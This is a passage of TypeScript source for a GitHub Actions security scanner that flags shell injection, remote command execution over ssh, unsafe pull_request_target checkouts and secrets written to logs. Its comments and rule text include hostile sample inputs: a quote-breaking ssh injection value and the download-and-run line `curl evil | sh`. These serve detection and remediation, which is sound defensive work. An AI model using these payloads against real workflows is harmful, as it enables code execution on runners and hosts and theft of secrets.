/**
 * GitHub Actions workflow rules: where untrusted input becomes a shell.
 *
 * Why this is a separate engine
 * -----------------------------
 * A workflow is YAML wrapped around shell, and the security question is a
 * question about the *seam*. `${{ … }}` is substituted by the runner into the
 * script text before any shell sees it, so quoting cannot help; an `env:`
 * variable is safe locally because the shell expands it as data, and stops
 * being safe the moment the script pastes it into a string that another shell
 * parses — `ssh host "VAR='$VAR' bash -s"`, `bash -c "… $VAR"`, `eval`. None of
 * that is visible line by line: which variable holds what is declared in an
 * `env:` map three keys away, and which inputs are free text is declared at the
 * top of the file. So the file is parsed as YAML and the `run:` scripts are
 * read with the workflow around them.
 *
 * The incident that prompted it (2026-11-20): a stolen GitHub App key
 * dispatched a break-glass workflow whose `ips` input reached production as
 * `ssh "$U@$H" "IPS='$IPS' bash -s"`. The value `0.0.0.0'; <payload>; #` closed
 * the quote and ran as the deploy user. A sibling workflow took a free-form
 * `cmd` input and ran it over ssh by design. Both read as "passes input through
 * env, never interpolated" to a reviewer; both were remote code execution for
 * anyone able to dispatch them.
 *
 * What these rules claim
 * ----------------------
 * The shell reading here is a small lexer, not bash. It tracks quotes, splits
 * commands and pipelines, follows `env:` and in-script assignments, and knows
 * what `ssh`, `sh -c` and `eval` do with their arguments. It does not follow
 * step outputs or reusable-workflow inputs, and it cannot see a validation
 * done anywhere but a `[[ $VAR =~ … ]]` in the same step. Where the
 * attacker-controlled source is visible in the file, findings are
 * `contextual`; the key and logging rules are `pattern`.
 */

import { isMap, isScalar, isSeq, LineCounter, parseDocument } from 'yaml';
import type { Node as YamlNode, Scalar, YAMLMap } from 'yaml';
import type { Confidence, Severity } from './types';
import { severityFor } from './types';

export interface WorkflowRule {
  id: string;
  title: string;
  severity: Severity;
  confidence: Confidence;
  cwe: string;
  consequence: string;
  fix: string;
}

export interface WorkflowMatch {
  rule: WorkflowRule;
  /** 1-based source line. */
  line: number;
  severity: Severity;
  message: string;
}

const RULE_LIST = [
  {
    id: 'gha-expression-injection',
    title: 'Attacker-controllable expression interpolated into a run script',
    severity: 'high',
    confidence: 'contextual',
    cwe: 'CWE-78',
    consequence:
      'The runner pastes `${{ … }}` into the script text before the shell parses it, so quoting does not help: a value such as `"; curl evil | sh; #` runs as code on the runner, with the job token and every secret in scope.',
    fix: 'Pass the value through `env:` (`VAR: ${{ inputs.x }}`) and use `"$VAR"` in the script; validate free text against an allow-list regex before use.',
  },
  {
    id: 'gha-input-in-remote-shell',
    title: 'Attacker-controllable value pasted into a command string another shell parses',
    severity: 'critical',
    confidence: 'contextual',
    cwe: 'CWE-78',
    consequence:
      'Passing input through `env:` keeps it data for the local shell only. Once `$VAR` is expanded into an ssh command line, a `bash -c` / `sh -c` string or `eval`, the receiving shell parses it as code, so a quote in the value breaks out and runs commands, on the remote host for ssh.',
    fix: 'Never build a remote or nested command string from input. Send it as data: `printf \'%s\\n\' "$VAR" | ssh host \'xargs -n1 cmd --\'`, or use `bash -c \'cmd "$1"\' _ "$VAR"`, and validate it with an allow-list regex first. Restrict the server key with `restrict,command=`.',
  },
  {
    id: 'gha-dispatch-remote-exec',
    title: 'Dispatchable workflow runs a free-text input as a command on a remote host',
    severity: 'critical',
    confidence: 'contextual',
    cwe: 'CWE-78',
    consequence:
      'Anyone who can dispatch the workflow (a collaborator, a leaked token, a compromised GitHub App) gets an arbitrary shell on the target host as the deploy user, logged only as an ordinary workflow run.',
    fix: 'Remove the workflow, or replace the free-text command with a `type: choice` input mapped to fixed scripts on the server, and pin the deploy key to a forced command (`restrict,command="/usr/local/bin/allowed-ops"`).',
  },
  {
    id: 'gha-ssh-key-secret',
    title: 'SSH private key from a secret used to reach a host',
    severity: 'medium',
    confidence: 'pattern',
    cwe: 'CWE-250',
    consequence:
      'Whether this key is limited cannot be verified from the repository. Unrestricted, it gives every run of this workflow, and anyone who can trigger one or read the secret, a full shell on the host.',
    fix: 'Verify the server-side authorized_keys entry is `restrict,command="…"` (plus `from=` if the runner range is known), scoped to the one operation this workflow performs.',
  },
  {
    id: 'gha-pull-request-target-checkout',
    title: 'pull_request_target workflow checks out the pull request head',
    severity: 'high',
    confidence: 'contextual',
    cwe: 'CWE-829',
    consequence:
      '`pull_request_target` runs with repository secrets and a write token. Checking out the head of a fork PR and building or running it hands those to code any outsider can submit.',
    fix: 'Use `pull_request` for anything that builds or runs PR code; keep `pull_request_target` to labelling/commenting jobs that never check out or execute the head.',
  },
  {
    id: 'gha-secrets-to-log',
    title: 'Secret written to the job log',
    severity: 'medium',
    confidence: 'pattern',
    cwe: 'CWE-532',
    consequence:
      'Masking only redacts the exact secret string. Encoded, transformed or traced (`set -x`) forms are printed in clear into a log readable by anyone with read access to the repository.',
    fix: 'Never echo secrets. Write them straight to a file or to a `--password-stdin` style consumer, and drop `set -x` from steps that handle secrets.',
  },
] as const satisfies readonly WorkflowRule[];

export const WORKFLOW_RULES: readonly WorkflowRule[] = RULE_LIST;

type RuleId = (typeof RULE_LIST)[number]['id'];
const RULE = Object.fromEntries(RULE_LIST.map((r) => [r.id, r])) as Record<RuleId, WorkflowRule>;

/**
 * Is this file a GitHub Actions (or Forgejo/Gitea Actions) workflow?
 *
 * By path when the path says so, at any depth so a scan root above several
 * repositories still reaches them. By shape otherwise: a scan rooted *inside*
 * `.github` sees `workflows/ci.yml`, and a single file passed on its own sees
 * only its name, so a YAML file with top-level `on:` and `jobs:` keys counts
 * too. The rules need `jobs.*.steps` to say anything, so a false match on
 * shape costs a parse and nothing else.
 */
export function isWorkflowPath(relativePath: string, text?: string): boolean {
  const p = relativePath.replace(/\\/g, '/');
  if (!/\.ya?ml$/i.test(p)) return false;
  if (/(?:^|\/)\.(?:github|forgejo|gitea)\/workflows\/[^/]+$/i.test(p)) return true;
  return text !== undefined && /^["']?on["']?\s*:/m.test(text) && /^jobs\s*:/m.test(text);
}

// ── Sources ───────────────────────────────────────────────────────────────

/**
 * Event fields anyone who can open an issue, PR, comment or push a branch
 * controls. The list follows GitHub's own "untrusted input" guidance.
 */
const UNTRUSTED_EVENT = new RegExp(
  String.raw`\bgithub\.(?:head_ref\b|event\.(?:` +
    [
      String.raw`(?:issue|pull_request|discussion)\.(?:title|body)\b`,
      String.raw`pull_request\.head\.(?:ref|label|repo\.default_branch)\b`,
      String.raw`(?:comment|review|review_comment)\.body\b`,
      String.raw`client_payload\b`,
      String.raw`(?:head_commit|commits(?:\[[^\]]*\]|\.\*)?)\.(?:message|author\.(?:name|email)|committer\.(?:name|email))\b`,
      String.raw`pages(?:\[[^\]]*\]|\.\*)?\.page_name\b`,
      String.raw`workflow_run\.(?:head_branch|display_title|head_commit\.(?:message|author\.(?:name|email)))\b`,
    ].join('|') +
    '))',
);

const INPUT_REF = /\b(?:github\.event\.)?inputs\.([A-Za-z_][\w-]*)/g;
const EXPRESSION = /\$\{\{([\s\S]*?)\}\}/g;

interface WorkflowContext {
  triggers: Set<string>;
  /** Input name → is it free text (string or undeclared type)? */
  inputs: Map<string, boolean>;
}

function isDispatchable(ctx: WorkflowContext): boolean {
  return ctx.triggers.has('workflow_dispatch') || ctx.triggers.has('repository_dispatch');
}

/** Is this expression body (`inputs.ips || ''`) built from something an outsider controls? */
function expressionIsTainted(body: string, ctx: WorkflowContext): boolean {
  if (UNTRUSTED_EVENT.test(body)) return true;
  for (const match of body.matchAll(INPUT_REF)) {
    // An input the file never declares (a composite action, a typo) is
    // treated as free text: the conservative reading.
    if (ctx.inputs.get(match[1]!) ?? true) return true;
  }
  return false;
}

function hasTaintedExpression(text: string, ctx: WorkflowContext): boolean {
  for (const m of text.matchAll(EXPRESSION)) if (expressionIsTainted(m[1]!, ctx)) return true;
  return false;
}

const SECRET_EXPRESSION = /\$\{\{[^}]*\b(?:secrets\.|toJSON\(\s*secrets\s*\))[^}]*\}\}/;

// ── YAML helpers ──────────────────────────────────────────────────────────

function get(map: unknown, key: string): YamlNode | undefined {
  if (!isMap(map)) return undefined;
  for (const pair of (map as YAMLMap).items) {
    if (isScalar(pair.key) && String((pair.key as Scalar).value) === key) return pair.value as YamlNode | undefined;
  }
  return undefined;
}

function str(node: unknown): string | undefined {
  if (!isScalar(node)) return undefined;
  const v = (node as Scalar).value;
  return v === null || v === undefined ? undefined : String(v);
}

function entries(map: unknown): Array<[string, YamlNode | undefined]> {
  if (!isMap(map)) return [];
  return (map as YAMLMap).items
    .filter((pair) => isScalar(pair.key))
    .map((pair) => [String((pair.key as Scalar).value), pair.value as YamlNode | undefined]);
}

interface ScriptText {
  lines: string[];
  /** 1-based source line for each script line. */
  sourceLine: number[];
  /**
   * The source line holding `snippet`, searching from script line `index`.
   * Exact for a literal block; for a folded scalar, where several source lines
   * become one script line, this is what finds the right one.
   */
  locate: (index: number, snippet: string) => number;
}

/**
 * A scalar's text with a source line for every line of it.
 *
 * A literal block (`run: |`) keeps its line breaks, so script line i sits i+1
 * lines below the indicator. Folded and flow scalars lose them, so each line
 * is located by searching the source from where the scalar starts.
 */
function scriptOf(node: YamlNode, lc: LineCounter, source: readonly string[]): ScriptText | undefined {
  if (!isScalar(node) || node.range == null) return undefined;
  const text = str(node);
  if (text === undefined) return undefined;
  const lines = text.split('\n');
  const start = lc.linePos(node.range[0]).line;
  const end = lc.linePos(node.range[2]).line;
  const scalar = node as Scalar;

  const locator = (sourceLine: number[]) => (index: number, snippet: string): number => {
    const from = sourceLine[index] ?? start;
    for (let i = from; i <= Math.max(end, from); i += 1) {
      if ((source[i - 1] ?? '').includes(snippet)) return i;
    }
    return from;
  };

  if (scalar.type === 'BLOCK_LITERAL') {
    const sourceLine = lines.map((_l, i) => start + 1 + i);
    return { lines, sourceLine, locate: locator(sourceLine) };
  }

  const sourceLine: number[] = [];
  let cursor = start;
  for (const line of lines) {
    const needle = line.trim();
    let found = cursor;
    if (needle) {
      for (let i = cursor; i <= Math.max(end, cursor); i += 1) {
        if ((source[i - 1] ?? '').includes(needle)) { found = i; break; }
      }
    }
    sourceLine.push(found);
    cursor = found;
  }
  return { lines, sourceLine, locate: locator(sourceLine) };
}

// ── Shell lexing ──────────────────────────────────────────────────────────

const Q = { None: 0, Single: 1, Double: 2 } as const;
type Q = (typeof Q)[keyof typeof Q];

/** Quote state of every character: what the *local* shell does with it. */
function quoteStates(text: string): Q[] {
  const out: Q[] = [];
  let state: Q = Q.None;
  for (let i = 0; i < text.length; i += 1) {
    const c = text[i]!;
    if (state === Q.Single) {
      out.push(Q.Single);
      if (c === "'") state = Q.None;
      continue;
    }
    if (c === '\\' && i + 1 < text.length) {
      out.push(state, state);
      i += 1;
      continue;
    }
    if (state === Q.None && c === "'") { out.push(Q.Single); state = Q.Single; continue; }
    if (c === '"') { out.push(Q.Double); state = state === Q.Double ? Q.None : Q.Double; continue; }
    out.push(state);
  }
  return out;
}

interface Word { text: string; start: number; end: number }

/** Split on unquoted whitespace. Quotes stay in the word text. */
function words(text: string, states: readonly Q[], offset = 0): Word[] {
  const out: Word[] = [];
  let start = -1;
  for (let i = 0; i <= text.length; i += 1) {
    const ws = i === text.length || (states[i + offset] === Q.None && /\s/.test(text[i]!));
    if (ws) {
      if (start >= 0) out.push({ text: text.slice(start, i), start: start + offset, end: i + offset });
      start = -1;
    } else if (start < 0) start = i;
  }
  return out;
}

function unquote(word: string): string {
  return word.replace(/'([^']*)'|"((?:\\.|[^"\\])*)"/g, (_m, s: string | undefined, d: string | undefined) => s ?? d ?? '');
}

interface Ref { start: number; end: number; name: string; expression: boolean; tainted: boolean; secret: boolean }

interface Taint { vars: Set<string>; secrets: Set<string> }

/** Every `${{ … }}` and `$VAR` in the text, with what it carries. */
function references(text: string, ctx: WorkflowContext, taint: Taint): Ref[] {
  const out: Ref[] = [];
  for (const m of text.matchAll(EXPRESSION)) {
    out.push({
      start: m.index!, end: m.index! + m[0].length, name: m[1]!.trim(), expression: true,
      tainted: expressionIsTainted(m[1]!, ctx), secret: SECRET_EXPRESSION.test(m[0]),
    });
  }
  for (const m of text.matchAll(/\$(?:\{([A-Za-z_]\w*)[^}]*\}|([A-Za-z_]\w*))/g)) {
    if (text.startsWith('${{', m.index!)) continue;
    const name = (m[1] ?? m[2])!;
    out.push({
      start: m.index!, end: m.index! + m[0].length, name, expression: false,
      tainted: taint.vars.has(name), secret: taint.secrets.has(name),
    });
  }
  return out;
}

/** Does the local shell substitute this reference before the command runs? */
function expandsLocally(ref: Ref, states: readonly Q[]): boolean {
  return ref.expression || states[ref.start] !== Q.Single;
}

/** Is the word nothing but one reference (`"$CMD"`, `${{ inputs.cmd }}`)? */
function isWholeReference(word: string, ctx: WorkflowContext, taint: Taint): boolean {
  const bare = word.replace(/^["']|["']$/g, '');
  const refs = references(bare, ctx, taint);
  return refs.length === 1 && refs[0]!.start === 0 && refs[0]!.end === bare.length && refs[0]!.tainted;
}

interface LogicalLine {
  text: string;
  /** Index into script lines of the first physical line. */
  first: number;
  /** Char offset in `text` at which each physical line begins. */
  offsets: number[];
  heredoc?: { quoted: boolean; body: Array<{ text: string; index: number }> };
}

/** Join `\` continuations and collect heredoc bodies. */
function logicalLines(lines: readonly string[]): LogicalLine[] {
  const out: LogicalLine[] = [];
  let i = 0;
  while (i < lines.length) {
    const first = i;
    const offsets = [0];
    let text = lines[i]!;
    while (/(?:^|[^\\])\\$/.test(text) && i + 1 < lines.length) {
      text = `${text.slice(0, -1)} `;
      i += 1;
      offsets.push(text.length);
      text += lines[i]!;
    }
    i += 1;
    const line: LogicalLine = { text, first, offsets };
    const states = quoteStates(text);
    const hd = /<<-?\s*(['"]?)([A-Za-z_][\w-]*)\1/g;
    for (const m of text.matchAll(hd)) {
      if (states[m.index!] !== Q.None || text[m.index! - 1] === '<' || text[m.index! + 2] === '<') continue;
      const body: Array<{ text: string; index: number }> = [];
      while (i < lines.length && lines[i]!.trim() !== m[2]) {
        body.push({ text: lines[i]!, index: i });
        i += 1;
      }
      i += 1; // terminator
      line.heredoc = { quoted: m[1] !== '' || /\\/.test(m[0]), body };
      break;
    }
    out.push(line);
  }
  return out;
}

interface Command { words: Word[]; text: string; start: number }

/** Pipelines (split on `;`, `&&`, `||`, `&`), each a list of commands split on `|`. */
function pipelines(text: string, states: readonly Q[]): Command[][] {
  const result: Command[][] = [];
  let current: Command[] = [];
  let start = 0;
  const push = (end: number): void => {
    const slice = text.slice(start, end);
    if (slice.trim()) current.push({ words: words(slice, states, start), text: slice, start });
  };
  for (let i = 0; i < text.length; i += 1) {
    if (states[i] !== Q.None) continue;
    const c = text[i]!;
    const d = text[i + 1];
    if (c === '#' && (i === 0 || /\s/.test(text[i - 1]!))) { push(i); start = text.length; break; }
    if ((c === '&' && d === '&') || (c === '|' && d === '|')) {
      push(i); result.push(current); current = []; start = i + 2; i += 1; continue;
    }
    if (c === ';' || (c === '&' && text[i - 1] !== '>' && d !== '>')) {
      push(i); result.push(current); current = []; start = i + 1; continue;
    }
    if (c === '|' && text[i - 1] !== '>') { push(i); start = i + 1; continue; }
  }
  push(text.length);
  result.push(current);
  return result.filter((p) => p.length > 0);
}

const WRAPPERS = new Set(['sudo', 'exec', 'command', 'nohup', 'time', 'env', 'timeout', 'sshpass', 'doas']);

/** The command words with leading assignments, wrappers and their flags removed. */
function commandWords(cmd: Command): Word[] {
  const ws = cmd.words;
  let i = 0;
  while (i < ws.length) {
    const w = ws[i]!.text;
    if (/^[A-Za-z_]\w*=/.test(w)) { i += 1; continue; }
    const base = w.replace(/^.*\//, '');
    if (WRAPPERS.has(base)) {
      i += 1;
      while (i < ws.length && (ws[i]!.text.startsWith('-') || /^\d+[smhd]?$/.test(ws[i]!.text))) {
        // `sshpass -p secret`, `sudo -u deploy`: flags that take a value.
        if (/^-[pfuUge]$/.test(ws[i]!.text)) i += 1;
        i += 1;
      }
      continue;
    }
    break;
  }
  return ws.slice(i);
}

const SHELLS = /^(?:ba|z|da|k|a)?sh$/;
const REMOTE_SHELL = /^(?:(?:sudo|exec|env)\s+(?:-\S+\s+)*)?(?:\S*\/)?(?:ba|z|da|k)?sh(?:\s|$)/;
/** ssh options that take a value. */
const SSH_VALUE_OPTS = new Set('BbcDEeFIiJLlmOoPpQRSWw'.split(''));

interface SshParts {
  /** Words that form the remote command line. */
  remote: Word[];
  /** Here-string payload, if any. */
  hereString?: Word;
  /** Is the remote side a shell reading its script from stdin? */
  shellOnStdin: boolean;
}

function parseSsh(ws: readonly Word[]): SshParts {
  let i = 1;
  while (i < ws.length && ws[i]!.text.startsWith('-')) {
    const flag = ws[i]!.text;
    const last = flag[flag.length - 1]!;
    i += flag.length === 2 && SSH_VALUE_OPTS.has(last) ? 2 : 1;
  }
  i += 1; // destination
  const remote: Word[] = [];
  let hereString: Word | undefined;
  for (; i < ws.length; i += 1) {
    const w = ws[i]!;
    if (w.text.startsWith('<<<')) {
      hereString = w.text.length > 3
        ? { text: w.text.slice(3), start: w.start + 3, end: w.end }
        : ws[i + 1];
      break;
    }
    if (/^(?:\d?>>?|&>|<<?|\d?<)/.test(w.text)) break;
    remote.push(w);
  }
  const remoteText = unquote(remote.map((w) => w.text).join(' '))
    .replace(/^(?:[A-Za-z_]\w*=(?:'[^']*'|"[^"]*"|\S*)\s+)*/, '')
    .trim();
  return { remote, hereString, shellOnStdin: remoteText === '' || REMOTE_SHELL.test(remoteText) };
}

// ── The analysis ──────────────────────────────────────────────────────────

interface Emit {
  (rule: RuleId, line: number, message: string, severity?: Severity): void;
}

interface StepScript {
  script: ScriptText;
  env: Map<string, string>;
}

function envOf(node: YamlNode | undefined): Map<string, string> {
  const out = new Map<string, string>();
  for (const [k, v] of entries(node)) out.set(k, str(v) ?? '');
  return out;
}

function taintFromEnv(env: Map<string, string>, ctx: WorkflowContext, into: Taint): void {
  for (const [name, value] of env) {
    if (hasTaintedExpression(value, ctx)) into.vars.add(name);
    if (SECRET_EXPRESSION.test(value)) into.secrets.add(name);
  }
}

function cloneTaint(t: Taint): Taint {
  return { vars: new Set(t.vars), secrets: new Set(t.secrets) };
}

const ASSIGNMENT = /^\s*(?:export\s+|local\s+|readonly\s+|declare\s+(?:-\w+\s+)?)?([A-Za-z_]\w*)=(.*)$/;
const GITHUB_ENV_WRITE = /\b(?:echo|printf)\b[^>]*?["']?([A-Za-z_]\w*)=([^>]*)>>\s*["']?\$\{?GITHUB_ENV\b/;

/** Read one `run:` script. Returns the variables it exports to later steps via `$GITHUB_ENV`. */
function analyseScript(
  step: StepScript,
  ctx: WorkflowContext,
  inherited: Taint,
  emit: Emit,
): Taint {
  const { lines, sourceLine } = step.script;
  const taint = cloneTaint(inherited);
  taintFromEnv(step.env, ctx, taint);
  const exported: Taint = { vars: new Set(), secrets: new Set() };
  const reported = new Set<number>();

  // In-script assignments and `$GITHUB_ENV` exports, to a fixed point so that
  // `B=$A` after `A=${{ inputs.x }}` is followed whatever the order.
  for (let pass = 0; pass < 3; pass += 1) {
    for (const line of lines) {
      const assign = ASSIGNMENT.exec(line);
      const refs = assign ? references(assign[2]!, ctx, taint) : [];
      if (assign && refs.some((r) => r.tainted)) taint.vars.add(assign[1]!);
      // `X=$(curl -H "…$TOKEN" …)` holds a response, not the secret, so
      // secret-ness follows plain copies and expansions only.
      if (assign && refs.some((r) => r.secret) && !/^\s*["']?(?:\$\(|`)/.test(assign[2]!)) {
        taint.secrets.add(assign[1]!);
      }
      const ge = GITHUB_ENV_WRITE.exec(line);
      if (ge) {
        const geRefs = references(ge[2]!, ctx, taint);
        if (geRefs.some((r) => r.tainted)) exported.vars.add(ge[1]!);
        if (geRefs.some((r) => r.secret)) exported.secrets.add(ge[1]!);
      }
    }
  }

  const script = lines.join('\n');
  const validated = (name: string): boolean =>
    new RegExp(String.raw`\[\[\s*"?\$\{?${name}\}?"?\s*=~`).test(script) ||
    new RegExp(String.raw`case\s+"?\$\{?${name}\}?"?\s+in`).test(script);
  const usesSecrets =
    taint.secrets.size > 0 || SECRET_EXPRESSION.test(script);

  const flagRemote = (
    ref: Ref,
    line: number,
    how: string,
    whole: boolean,
    remote: boolean,
  ): void => {
    reported.add(line);
    const label = ref.expression ? `\`\${{ ${ref.name} }}\`` : `\`$${ref.name}\``;
    if (whole && remote && isDispatchable(ctx)) {
      emit('gha-dispatch-remote-exec', line,
        `${label} is executed as a command on a remote host (${how}) by a ${[...ctx.triggers].filter((t) => t.endsWith('dispatch')).join('/')} workflow`);
      return;
    }
    const isValidated = !ref.expression && validated(ref.name);
    emit('gha-input-in-remote-shell', line,
      `${label} carries attacker-controllable input and is expanded into ${how}` +
        (isValidated ? ' — it is regex-checked in this step; confirm the pattern excludes quotes and shell metacharacters' : ''),
      isValidated ? 'medium' : undefined);
  };

  // Output of `{ …; } > file` and `( … ) >> "$GITHUB_ENV"` groups goes to the
  // file, not the log: note which logical lines sit inside one.
  const logicals = logicalLines(lines);
  const toFile = /^[})]\s*(?:\d?>>?|&>>?)\s*(?!&[12]|\/dev\/std)\S/;
  const grouped = new Set<number>();
  logicals.forEach((logical, k) => {
    const trimmed = logical.text.trim();
    if (/[})]\s*(?:\d?>>?|&>>?)\s*(?!&[12]|\/dev\/std)\S/.test(trimmed) && /^[{(]/.test(trimmed)) grouped.add(k);
    if (!toFile.test(trimmed)) return;
    // A multi-line group: everything back to the line that opened it.
    const inside: number[] = [];
    for (let j = k - 1; j >= 0; j -= 1) {
      if (/^[{(]\s*$/.test(logicals[j]!.text.trim())) {
        for (const i of inside) grouped.add(i);
        return;
      }
      inside.push(j);
    }
  });

  for (const [logicalIndex, logical] of logicals.entries()) {
    const { text } = logical;
    const states = quoteStates(text);
    const lineAt = (pos: number): number => {
      let k = 0;
      while (k + 1 < logical.offsets.length && logical.offsets[k + 1]! <= pos) k += 1;
      const m = /^\$\{\{[\s\S]*?\}\}|^\$\{?\w+\}?/.exec(text.slice(pos));
      return step.script.locate(logical.first + k, m ? m[0] : '');
    };
    const refsIn = (from: number, to: number): Ref[] =>
      references(text, ctx, taint).filter((r) => r.start >= from && r.end <= to && expandsLocally(r, states));

    for (const pipeline of pipelines(text, states)) {
      pipeline.forEach((cmd, position) => {
        const ws = commandWords(cmd);
        if (ws.length === 0) return;
        const name = unquote(ws[0]!.text).replace(/^.*\//, '');

        // ssh: the remote command line, here-strings, and stdin from a pipe.
        if (name === 'ssh' || name === 'autossh') {
          const ssh = parseSsh(ws);
          if (ssh.remote.length > 0) {
            const from = ssh.remote[0]!.start;
            const to = ssh.remote[ssh.remote.length - 1]!.end;
            const whole = ssh.remote.length === 1 && isWholeReference(ssh.remote[0]!.text, ctx, taint);
            for (const ref of refsIn(from, to).filter((r) => r.tainted)) {
              flagRemote(ref, lineAt(ref.start), 'the ssh remote command line', whole, true);
            }
          }
          if (ssh.shellOnStdin && ssh.hereString) {
            const hs = ssh.hereString;
            const whole = isWholeReference(hs.text, ctx, taint);
            for (const ref of refsIn(hs.start, hs.end).filter((r) => r.tainted)) {
              flagRemote(ref, lineAt(ref.start), 'a here-string fed to a remote shell', whole, true);
            }
          }
          if (ssh.shellOnStdin && position > 0) {
            const feeder = pipeline[position - 1]!;
            const fw = commandWords(feeder);
            const fname = fw[0] ? unquote(fw[0].text) : '';
            if (/^(?:echo|printf|cat)$/.test(fname)) {
              const args = fw.slice(1).filter((w) => !/^-/.test(w.text) && !/%s/.test(w.text));
              const whole = args.length === 1 && isWholeReference(args[0]!.text, ctx, taint);
              for (const ref of refsIn(feeder.start, feeder.start + feeder.text.length).filter((r) => r.tainted)) {
                flagRemote(ref, lineAt(ref.start), 'a script piped to a remote shell', whole, true);
              }
            }
          }
          if (ssh.shellOnStdin && logical.heredoc && position === pipeline.length - 1) {
            for (const body of logical.heredoc.body) {
              // A quoted delimiter (`<<'EOF'`) stops local expansion of
              // `$VAR`; nothing stops the runner substituting `${{ }}`.
              const quoted = logical.heredoc.quoted;
              const brefs = references(body.text, ctx, taint).filter((r) => r.tainted && (r.expression || !quoted));
              const whole = isWholeReference(body.text.trim(), ctx, taint);
              for (const ref of brefs) {
                flagRemote(ref, sourceLine[body.index]!, 'a heredoc script run by a remote shell', whole, true);
              }
            }
          }
          return;
        }

        // `sh -c "<string>"`, wherever the shell sits in the command
        // (`docker exec c sh -c`, `su -c` aside).
        for (let i = 0; i < ws.length - 2; i += 1) {
          const base = unquote(ws[i]!.text).replace(/^.*\//, '');
          if ((SHELLS.test(base) || base === 'su') && /^-[A-Za-z]*c$/.test(ws[i + 1]!.text)) {
            const target = ws[i + 2]!;
            for (const ref of refsIn(target.start, target.end).filter((r) => r.tainted)) {
              flagRemote(ref, lineAt(ref.start), `the command string of \`${base} -c\``, false, false);
            }
            break;
          }
        }

        if (name === 'eval') {
          const from = ws[1]?.start ?? cmd.start + cmd.text.length;
          for (const ref of refsIn(from, cmd.start + cmd.text.length).filter((r) => r.tainted)) {
            flagRemote(ref, lineAt(ref.start), '`eval`', false, false);
          }
        }

        // Secrets printed to the log.
        const maskCommand = /::add-mask::/.test(cmd.text);
        if ((name === 'echo' || name === 'printf') && !maskCommand && !grouped.has(logicalIndex)) {
          const secretRefs = refsIn(cmd.start, cmd.start + cmd.text.length).filter((r) => r.secret);
          if (secretRefs.length > 0) {
            const redirected = (c: Command): boolean =>
              c.words.some((w, idx) => {
                const m = /^(?:\d?>>?|&>>?)(.*)$/.exec(w.text);
                if (!m) return false;
                const target = m[1] || c.words[idx + 1]?.text || '';
                return !/^(?:&[12]|["']?\/dev\/std(?:out|err))/.test(target);
              });
            const rest = pipeline.slice(position + 1);
            const encoders = /^(?:base64|basenc|xxd|od|hexdump|rev|openssl|gpg|age|tr|sed|awk|cut|fold)$/;
            let logged: string | null = null;
            if (rest.length === 0) {
              if (!redirected(cmd)) logged = 'printed';
            } else {
              // Every later stage must be a filter that prints: `| base64 -d |
              // gpg --import` hands the secret to a consumer, not to the log.
              const names = rest.map((c) => {
                const first = commandWords(c)[0];
                return first ? unquote(first.text).replace(/^.*\//, '') : '';
              });
              // gpg and openssl print only when encrypting or encoding;
              // `gpg --import` and `openssl pkey -in` consume.
              const prints = (n: string, c: Command): boolean =>
                n === 'gpg' ? /\s(?:-\w*[ea]\w*|--encrypt|--armor|--symmetric)\b/.test(c.text)
                  : n === 'openssl' ? /\bopenssl\s+(?:enc|pkeyutl|rsautl|base64|smime|cms)\b/.test(c.text)
                    : encoders.test(n);
              if (names.every((n, k) => prints(n, rest[k]!)) && !redirected(rest[rest.length - 1]!)) {
                logged = `piped through \`${names.join(' | ')}\`, which defeats log masking, and printed`;
              }
            }
            if (logged) {
              const ref = secretRefs[0]!;
              emit('gha-secrets-to-log', lineAt(ref.start),
                `${ref.expression ? `\`\${{ ${ref.name} }}\`` : `\`$${ref.name}\` (holds a secret)`} is ${logged} to the job log`);
            }
          }
        }

        if (usesSecrets && (name === 'set' && ws.some((w) => /^-[a-zA-Z]*x[a-zA-Z]*$/.test(w.text) || w.text === 'xtrace'))) {
          emit('gha-secrets-to-log', lineAt(ws[0]!.start),
            '`set -x` traces every expanded command, secrets included, in a step that handles secrets');
        }
      });
    }
  }

  // Expression injection: any tainted `${{ }}` the runner pastes into the
  // script, on lines not already reported as the stronger remote finding.
  lines.forEach((line, index) => {
    for (const m of line.matchAll(EXPRESSION)) {
      if (!expressionIsTainted(m[1]!, ctx)) continue;
      // The runner substitutes inside shell comments too, but only a value
      // that can hold a newline escapes one. A branch name cannot.
      if (/^\s*#/.test(line) && !/\.(?:title|body|message)\b|client_payload|inputs\./.test(m[1]!)) continue;
      const src = step.script.locate(index, m[0]);
      if (reported.has(src)) continue;
      emit('gha-expression-injection', src, `\`\${{ ${m[1]!.trim()} }}\` is interpolated into a run script`);
      break;
    }
    if (/\$\{\{\s*toJSON\(\s*secrets\s*\)\s*\}\}/.test(line)) {
      emit('gha-secrets-to-log', step.script.locate(index, 'toJSON'), 'every repository secret is serialised into the script with `toJSON(secrets)`');
    }
  });

  return exported;
}

const SSH_KEY_WRITE = /(?:>|\btee\b|\bcp\b|\binstall\b|\bmv\b)[^#]*(?:~|\$\{?HOME\}?|\/root|\/home\/[\w.-]+)\/\.ssh\/id_[\w.-]*/;
const SSH_KEY_ACTIONS = /(?:ssh-agent|ssh-key-action|install-ssh-key|ssh-action|scp-action|ssh-deploy)@/i;
const SSH_USE = /(?:^|[\s;&|(])(?:ssh|scp|rsync|sftp|autossh)\s/;

/** Run every workflow rule over one workflow file. */
export function evaluateWorkflowRules(text: string): WorkflowMatch[] {
  const lc = new LineCounter();
  let doc;
  try {
    doc = parseDocument(text, { lineCounter: lc, uniqueKeys: false, strict: false });
  } catch {
    return [];
  }
  if (doc.errors.length > 0 || !isMap(doc.contents)) return [];
  const root = doc.contents;
  const source = text.split('\n');

  // Triggers and the inputs they declare.
  const ctx: WorkflowContext = { triggers: new Set(), inputs: new Map() };
  const on = get(root, 'on') ?? get(root, 'true');
  if (isScalar(on)) ctx.triggers.add(String(on.value));
  else if (isSeq(on)) for (const item of on.items) { const s = str(item); if (s) ctx.triggers.add(s); }
  else if (isMap(on)) {
    for (const [trigger, cfg] of entries(on)) {
      ctx.triggers.add(trigger);
      for (const [input, spec] of entries(get(cfg, 'inputs'))) {
        const type = str(get(spec, 'type'));
        ctx.inputs.set(input, type === undefined || type === 'string');
      }
    }
  }

  const matches: WorkflowMatch[] = [];
  const seen = new Set<string>();
  const emit: Emit = (id, line, message, severity) => {
    const key = `${id}:${line}`;
    if (seen.has(key)) return;
    seen.add(key);
    const rule = RULE[id];
    matches.push({ rule, line, severity: severityFor(severity ?? rule.severity, rule.confidence), message });
  };

  const lineOf = (node: YamlNode | undefined): number =>
    node?.range ? lc.linePos(node.range[0]).line : 1;

  const workflowTaint: Taint = { vars: new Set(), secrets: new Set() };
  taintFromEnv(envOf(get(root, 'env')), ctx, workflowTaint);

  const prTarget = ctx.triggers.has('pull_request_target');

